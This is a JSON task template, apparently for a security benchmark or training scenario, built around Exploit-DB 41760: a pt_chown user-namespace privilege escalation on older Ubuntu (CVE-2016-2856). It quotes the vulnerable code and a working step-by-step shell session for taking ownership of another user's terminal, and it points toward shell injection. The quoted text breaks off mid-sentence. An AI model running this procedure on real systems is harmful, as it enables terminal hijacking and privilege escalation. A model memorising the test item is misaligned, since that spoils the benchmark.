@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41760",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation (CVE-2016-2856)\n\nExploit source code (41760.txt):\n```\nSource: http://www.halfdog.net/Security/2015/PtChownArbitraryPtsAccessViaUserNamespace/\n\n## Introduction\n\nProblem description: With Ubuntu Wily and earlier, /usr/lib/pt_chown was used to change ownership of slave pts devices in /dev/pts to the same uid holding the master file descriptor for the slave. This is done using the pt_chown SUID binary, which invokes the ptsname function on the master-fd, thus again performing a TIOCGPTN ioctl to get the slave pts number. Using the result from the ioctl, the pathname of the slave pts is constructed and chown invoked on it, see login/programs/pt_chown.c:\n\n  pty = ptsname (PTY_FILENO);\n  if (pty == NULL)\n    ...\n  /* Get the group ID of the special `tty' group.  */\n  p = getgrnam (TTY_GROUP);\n  gid = p ? p->gr_gid : getgid ();\n\n  /* Set the owner to the real user ID, and the group to that special\n     group ID.  */\n  if (chown (pty, getuid (), gid) < 0)\n    return FAIL_EACCES;\n\n  /* Set the permission mode to readable and writable by the owner,\n     and writable by the group.  */\n  if ((st.st_mode & ACCESSPERMS) != (S_IRUSR|S_IWUSR|S_IWGRP)\n      && chmod (pty, S_IRUSR|S_IWUSR|S_IWGRP) < 0)\n    return FAIL_EACCES;\n\n  return 0;\n\nThe logic above is severely flawed, when there can be more than one master/slave pair having the same number and thus same name. But this condition can be easily created by creating an user namespace, mounting devpts with the newinstance option, create master and slave pts pairs until the number overlaps with a target pts outside the namespace on the host, where there is interest to gain ownership and then\n\n## Methods\n\nExploitation is trivial: At first use any user namespace demo to create the namespace needed, e.g. UserNamespaceExec.c (http://www.halfdog.net/Misc/Utils/UserNamespaceExec.c) and work with standard shell commands, e.g. to take over /dev/pts/0:\n\ntest# who am I\ntest    pts/1        2015-12-27 12:00\ntest# ./UserNamespacesExec -- /bin/bash\nSetting uid map in /proc/5783/uid_map\nSetting gid map in /proc/5783/gid_map\neuid: 0, egid: 0\neuid: 0, egid: 0\nroot# mkdir mnt\nroot# mount -t devpts -o newinstance /dev/pts mnt\nroot# cd mnt\nroot# chmod 0666 ptmx\n\nUse a second shell to continue:\n\ntest# cd /proc/5783/cwd\ntest# ls -al\ntotal 4\ndrwxr-xr-x 2 root  root     0 Dec 27 12:48 .\ndrwxr-xr-x 7 test users 4096 Dec 27 11:57 ..\nc--------- 1 test users 5, 2 Dec 27 12:48 ptmx\ntest# exec 3<>ptmx\ntest# ls -al\ntotal 4\ndrwxr-xr-x 2 root  root       0 Dec 27 12:48 .\ndrwxr-xr-x 7 test users   4096 Dec 27 11:57 ..\ncrw------- 1 test users 136, 0 Dec 27 12:53 0\ncrw-rw-rw- 1 test users   5, 2 Dec 27 12:48 ptmx\ntest# ls -al /dev/pts/0\ncrw--w---- 1 root tty 136, 1 Dec 27  2015 /dev/pts/0\ntest# /usr/lib/pt_chown\ntest# ls -al /dev/pts/0\ncrw--w---- 1 test tty 136, 1 Dec 27 12:50 /dev/pts/0\n\nOn systems where the TIOCSTI-ioctl is not prohibited, the tools from TtyPushbackPrivilegeEscalation (http://www.halfdog.net/Security/2012/TtyPushbackPrivilegeEscalation/) to directly inject code into a shell using the\n```",
+  "cve": "CVE-2016-2856",
+  "exploitdb_id": "41760",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41760",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
